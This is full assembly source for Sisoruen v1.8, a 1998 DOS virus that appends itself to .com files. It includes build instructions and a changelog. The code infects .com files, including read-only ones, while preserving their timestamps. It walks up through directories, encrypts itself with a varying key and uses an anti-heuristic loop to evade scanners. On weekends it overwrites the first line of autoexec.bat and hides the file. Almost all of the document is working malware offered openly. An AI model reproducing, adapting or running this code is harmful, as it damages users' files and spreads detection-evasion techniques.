; ------------------------------------------------------------------------- ;
;         Sisoruen v1.8 coded by KilJaeden of the Codebreakers 1998         ;
; ------------------------------------------------------------------------- ;
; Description: `--------------------------------------| Size : 484 bytes    ;
;                                                     | Type : COM Appender ;
; v1.0 - start with a simple *.com appender           | Rate : All to Root  ;
; v1.1 - lets do some XOR,NEG,NOT,ROR encryption!     | DT   : DotDot Style ;
; v1.2 - infect even read only files, restore stamps  | Pload: autoexec.bat ;
; v1.3 - add anti-heuristic loop (credits to SPo0ky!) | Encrp: 4 times -    ;
; v1.4 - don't infect files too small, or too big     |   XOR,NEG,NOT,ROR   ;
; v1.5 - lets give it a payload, activate sat/sun     `-------------------- ;
; v1.6 - optimized a WHOLE lot, and fixed an error that was bugging the     ;
;      - crap out of me -> Thanks to SPo0ky for pointing out that my 'safe' ;
;      - place to store the DTA was getting destroyed by the encryption :)  ;
; v1.7 - lets get some directory transversal going, dot dot style           ;
; v1.8 - new payload this time, after it has infected all the .com's it can ;
;      - get it's hands on, it jumps to c:\ and replaces the first line of  ;
;      - the "autoexec.bat" file, changing the normal dos prompt (c:\) to   ;
;      - c:\::Sisoruen::> !warning! -> it replaces the first line, so be    ;
;      - carefull, some people have important info on that first line hehe  ;
;      - Oh and it also makes the autoexec.bat read-only and hidden! :)     ;
;      - Hey, some people don't know how to un-readonly / un-hide a file... ;
;      - Slows them down a little hehe                                      ;
; ------------------------------------------------------------------------- ;
; --> This One's For :Mind Warp: Keep Up The Great Work, You Learn Fast! <--;
; ------------------------------------------------------------------------- ;
; to compile ::] tasm sisoruen.asm                                          ;
; to link :::::] tlink /t sisoruen.asm                                      ;
; ------------------------------------------------------------------------- ;

code    segment                         ; name our segment code
        assume  cs:code,ds:code         ; assign cs and ds to code
        org     100h                    ; 100hex .com file

start:
        db      0e9h,0,0                ; define a blank jump to next line

real_start:
        mov     cx,0ffffh               ; from other anti-heuristics

anti_one:
        jmp     anti_two                ; jump to anti two
        mov     ax,4c00h                ; terminate program
        int     21h                     ; terminate the program

anti_two:
        loop    anti_one                ; loop anti_one
        call    get_delta               ; push IP on to stack

get_delta:
        pop     bp                      ; pop it into bp
        sub     bp,offset get_delta     ; get the delta offset

encrypt:
        jmp     not_on_first            ; don't encrypt 1st run (overwritten)
        lea     si,[bp+encrypted]       ; SI points to encrypted area start
        mov     di,si                   ; moves SI into DI
        call    encryption              ; calls the encryption routine
        jmp     encrypted               ; jump to start of encrypted area

encryption:
        lodsb                             ; load a byte
        not     al                        ; encryptin 1
        ror     al,4                      ; encryptin 2
        neg     al                        ; encryptin 3
        xor     al,byte ptr [bp+decrypt]  ; encryptin 4 -final-
        neg     al                        ; unencrypt 3
        ror     al,4                      ; unencrypt 2
        not     al                        ; unencrypt 1
        stosb                             ; store the byte
        loop    encryption                ; do it for all bytes
        ret                               ; return from the call

        decrypt db 0                      ; our key value

encrypted:
        lea     si,[bp+thrbyte]         ; where to put this
        mov     di,100h                 ; the starting location
        push    di                      ; 1 - push 100h until end 
        movsb                           ; move a byte
        movsw                           ; and move a word
        lea     dx,[bp+offset dta]      ; where we want to move the dta
        mov     ah,1ah                  ; move the dta
        int     21h                     ; make it so DOS!

find_next:
        mov     ah,4eh                  ; find the first file with
        lea     dx,[bp+comfile]         ; a *.com ending
        mov     cx,7                    ; find even if +srh

infect_next:
        int     21h                     ; make it so DOS!
        jnc     infect_file             ; found one? infect it!
        mov     ah,3bh                  ; change directory
        lea     dx,[bp+dotdot]          ; load up ".."
        int     21h                     ; and change dir now
        jnc     find_next               ; start infecting again

try_pay:
        mov     ah,2ah                  ; get system time
        int     21h                     ; get the time now
        cmp     al,006h                 ; is it saturday?
        je      payload                 ; it is! I love the weekends
        cmp     al,00h                  ; is it sunday?
        je      payload                 ; it is! I love payloading weekends

end_virus:
        mov     dx,80h                  ; restore the dta
        mov     ah,1ah                  ; restore it now
        int     21h                     ; make it so DOS!
        retn                            ; 1 - return control to host

payload:
        mov     ah,0eh                  ; change drive
        mov     dl,2                    ; to drive c:\
        int     21h                     ; change it now!

        mov     ah,3bh                  ; change directory
        lea     dx,[bp+rootdir]         ; load up "\"
        int     21h                     ; and change dir now

        mov     ah,4eh                  ; find the first file
        lea     dx,[bp+autoexe]         ; looking for "autoexec.bat" :)
        mov     cx,3                    ; find it even if +rh
        int     21h                     ; find the autoexec.bat!
        jc      end_virus               ; none? end the virus

        lea     dx,[bp+offset dta+1eh]  ; get the file info
        push    dx                      ; 7 - save that info for later
        mov     ax,4301h                ; set file attributes
        xor     cx,cx                   ; to absolutely none
        int     21h                     ; make it so DOS!

        mov     ax,3d02h                ; open the autoexec.bat
        int     21h                     ; open it / get info
        xchg    bx,ax                   ; exchange the info

        call    point_to_start          ; point to start of file

        mov     ah,40h                  ; write to the autoexec.bat
        lea     dx,[bp+newprmt]         ; write this
        mov     cx,cpend-cpstart        ; this much
        int     21h                     ; write it!

        pop     dx                      ; 7 - get the file info
        mov     ax,4301h                ; set file attributes
        mov     cx,3                    ; make it read only / hidden hehe
        int     21h                     ; infect even read only now! 

        mov     ah,3eh                  ; close the autoexec.bat
        int     21h                     ; close it now bitch!
        jmp     end_virus               ; jump to ending the virus

infect_file:
        lea     dx,[bp+offset dta+1eh]  ; get the file info
        push    dx                      ; 2 - save it again for in a minute
        mov     ax,4301h                ; set file attributes
        xor     cx,cx                   ; to absolutely none
        int     21h                     ; infect even read only now! 

        mov     ax,3d02h                ; open the file read/write
        pop     dx                      ; 2 - use that info again!
        int     21h                     ; make it so DOS!
        xchg    bx,ax                   ; move the file info

        mov     ax,5700h                ; get the time / date
        int     21h                     ; make it so DOS!
        push    dx                      ; 3 - save the value
        push    cx                      ; 4 - save this value too

        mov     ah,3fh                  ; read / record function
        lea     dx,[bp+thrbyte]         ; where to write to
        mov     cx,3                    ; how much to write
        int     21h                     ; make it so DOS!

        mov     ax,word ptr [bp+dta+1ah]     ; get the file size into ax
        mov     cx,word ptr [bp+thrbyte+1]   ; get those recorded bytes
        add     cx,finished-real_start+3     ; get virus + jump size
        cmp     ax,cx                        ; compare the two
        jz      close_file                   ; if equal close up
        cmp     ax,61440                     ; > then 61440 bytes?
        ja      close_file                   ; too big, close it
        cmp     ax,1000                      ; < then 1000 bytes?
        jb      close_file                   ; too big, close it

        sub     ax,3                       ; get the jump size
        mov     word ptr [bp+newjump+1],ax ; and write the jump

        call    point_to_start             ; point to start of file

        mov     ah,40h                     ; write to file
        mov     cx,3                       ; how much info? three bytes
        lea     dx,[bp+newjump]            ; where the info starts
        int     21h                        ; make it so DOS!
       
        mov     ax,4202h                   ; point to end of file
        xor     cx,cx                      ; cx to 0
        cwd                                ; likewize for DX
        int     21h                        ; make it so DOS

        in      al,40h                     ; get random value from clock
        mov     byte ptr [bp+decrypt],al   ; save that value as our key

        mov     ah,40h                     ; write to file
        lea     dx,[bp+real_start]         ; this is where we start
        mov     cx,encrypted-real_start    ; write this much
        int     21h                        ; write those bytes man!

        lea     di,[bp+finished]           ; DI points to encrypted area end
        push    di                         ; 5 - save value for later
        lea     si,[bp+encrypted]          ; SI points to encrypted area star
        mov     cx,finished-encrypted      ; total # of bytes to encrypt
        push    cx                         ; 6 - save that for next routine
        call    encryption                 ; encrypt them now

        mov     ah,40h                     ; write to file
        pop     cx                         ; 6 - mov cx,finished-encrypted
        pop     dx                         ; 5 - lea dx,[bp+finished]
        int     21h                        ; make it so DOS!

close_file:
        mov     ax,5701h                ; restore time / date
        pop     cx                      ; 4 - restore from this value
        pop     dx                      ; 3 - restore from this one too
        int     21h                     ; go for it!

        mov     ah,3eh                  ; close up the file
        int     21h                     ; make it so DOS!

        mov     ah,4fh                  ; find next file
        jmp     infect_next             ; and do it again

; ------------------------> Remote Calling Procedures <-------------------- ;
; ------------------------------------------------------------------------- ;

point_to_start:
        mov     ax,4200h                ; point to start of file
        xor     cx,cx                   ; cx to 0
        cwd                             ; likewize for DX
        int     21h                     ; and point to the start
        ret                             ; return from call

; -------------------------------> Data Area <----------------------------- ;
; ------------------------------------------------------------------------- ;

        cpstart:
        newprmt db 'prompt $p$f::Sisoruen::$g',0
                db '',10,13,'$'
        cpend:

        dotdot  db "..",0               ; define the .. string
        rootdir db "\",0                ; define the \ string
        autoexe db "autoexec.b*",0      ; look for autoexec.bat
        comfile db "*.c*",0             ; define *.com string
        thrbyte db 0cdh,20h,0           ; terminates on first run
        newjump db 0e9h,0,0             ; a blank jump at first
        dta db 42 dup (?)               ; set up space for dta
        finished label near             ; an offset label

; ----------> Temporary Storage Area (Not Saved / Not Encrypted) <--------- ;
; ------------------------------------------------------------------------- ;

not_on_first:
        lea     di,[bp+encrypt]         ; load DI with start address
        lea     si,[bp+newbytes]        ; load SI with the new bytes
        movsw                           ; move 2 bytes
        movsb                           ; move 1 byte
        jmp     encrypted               ; jump to start of encrypted area

newbytes:
        mov     cx,finished-encrypted   ; overwrite the jmp with this line

; ---------------------------> It's All Over <----------------------------- ;
; ------------------------------------------------------------------------- ;

        code    ends                    ; end code segment
        end     start                   ; end / where to start

; ------------------------------------------------------------------------- ;
; ----------> How Can You Think Freely In The Shadow Of A Church <--------- ;
; ------------------------------------------------------------------------- ;
